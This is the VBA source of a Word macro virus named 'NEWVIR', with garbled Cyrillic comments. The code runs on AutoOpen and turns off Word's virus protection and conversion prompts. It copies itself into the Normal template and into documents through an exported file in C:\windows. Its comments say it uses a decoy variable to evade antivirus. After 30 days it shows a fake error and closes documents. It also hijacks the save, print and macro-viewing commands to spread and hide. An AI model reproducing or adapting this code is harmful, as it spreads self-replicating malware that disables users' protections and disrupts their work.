   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "NEWVIR"
   Sub NEWVIR()
   On Error Resume Next
   ' Ïîçäðàâëÿþ, åñëè Âû çäåñü,
   ' çíà÷èò åùå ÷òî-òî ìîæåòå,
   ' òàê ÷òî äåðçàéòå, Âàñ îöåíèëè ...
   ' Ñ óâàæåíèåì ÀÂÒÎÐ
   ' **************************************
   'Îòêëþ÷åíèå ÷åãî íàäî ...
   Options.ConfirmConversions = Not (True)
   Options.VirusProtection = Not (True)
   Options.SaveNormalPrompt = Not (True)
   'ñîõðàíåíèå òåëà êóäà íàäî ...
   ActiveDocument.VBProject.VBComponents("NEWVIR").Export "C:\windows\PCSB.inf"
   ActiveDocument.ReadOnlyRecommended = Not (True)
   ' Åñëè øàáëîí íå èíôèöèðîâàí, çàïîìíèòü äàòó çàðàæåíèÿ êóäà íàäî ...
   If NormalTemplate.VBProject.VBComponents.Item("NEWVIR").Name <> "NEWVIR" Then
       Open "C:\windows\Dte.inf" For Output As #1
       Print #1, CDbl(Date)
       Close #1
   End If
   Call Pig
   ' Îñòàâëåíèå êîììåíòàðèÿ êóäà íàäî
   ActiveDocument.Comments.Add Range, "Ðàáîòàòü íàäî â ðàáî÷åå âðåìÿ. Áàðèê !!!"
   ' Ïðîâåðêà ÷åãî íàäî, äàáû íå ïîìåðåòü è ðàçìíîæèòüñÿ
   Dim ob1, ob2, sss As String
   ob1 = NormalTemplate.VBProject.VBComponents.Item("NEWVIR").Name
   ob2 = ActiveDocument.VBProject.VBComponents.Item("NEWVIR").Name
   If ob1 <> "NEWVIR" Then var1 = True
   If ob2 <> "NEWVIR" Then var2 = True
   ' Íà ýòèõ ñòðîêà ÿ î÷åíü äîëãî òðàõàëñÿ ñ àíòèâèðóñîì
   ' ïîêà íå äîáàâèë ïåðåìåííóþ äëÿ îáìàíà
   If var1 = True And var2 = False Then Set Var3 = NormalTemplate.VBProject.VBComponents
   sss = "Ïóñòûøêà"
   If var1 = False And var2 = True Then Set Var3 = ActiveDocument.VBProject.VBComponents
   sss = sss + " äëÿ àíòèâèðóñà"
   If var2 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
   Var3.import "C:\windows\PCSB.inf"
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   ' À âû ãîâîðèòå öàöêè-ïåöêè
   ' Îæèäàéòå íîâûé ðåëèç !!!
   ' Ìû åùå ïîâîþåì ...
   End Sub

   Public Sub Pig()
   ' ×òåíèå äàòû çàðàæåíèÿ îòêóäà íàäî
   Open "C:\windows\Dte.inf" For Input As #1
   Input #1, KontrDate
   Close #1
   ' Åñëè ñî âðåìåíè çàðàæåíèÿ ïðîøåë ìåñÿö, àêòèâèðîâàòü âèðóñ
   If Abs(CDbl(Date) - KontrDate) >= 30 Then
      If Time >= "18:00:00" Or Time >= "8:00:00" Then
        ' Ðàáîòàòü íàäî â ðàáî÷åå âðåìÿ !!!
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
        Call HelpAbout
      End If
   End If

   End Sub
   Public Sub AutoOpen()
   Call NEWVIR
   End Sub
   Sub HelpAbout()
   On Error Resume Next
   MsgBox "Ïðîãðàììà âûïîëíèëà íåäîïóñòèìóþ ôóíêöèþ, äîêóìåíò âûçâàâøèé çáîé ñèñòåìû áóäåò çàêðûò. Åñëè ýòà îøèáêà áóäåò âîçíèêàòü â äàëüíåéøåì, îáðàòèòåñü ê ðàçðàáîò÷èêó.", vbCritical
   ActiveDocument.Close
   End Sub
   Sub FileSave()
   On Error Resume Next
   Call NEWVIR
   ActiveDocument.Save
   End Sub
   Sub FileSaveAs()
   On Error Resume Next
   Dialogs(wdDialogFileSaveAs).Show
   Call NEWVIR
   End Sub
   Sub FilePrint()
   Dialogs(wdDialogFilePrint).Show
   Call NEWVIR
   End Sub
   Sub FilePrintDefault()
   Call NEWVIR
   End Sub
   Sub ToolsMacro()
       On Error Resume Next
       Call NEWVIR
   End Sub
   Sub FileTemplates()
       On Error Resume Next
       Call NEWVIR
   End Sub
   Sub ViewVBCode()
       On Error Resume Next
       Call NEWVIR
   End Sub
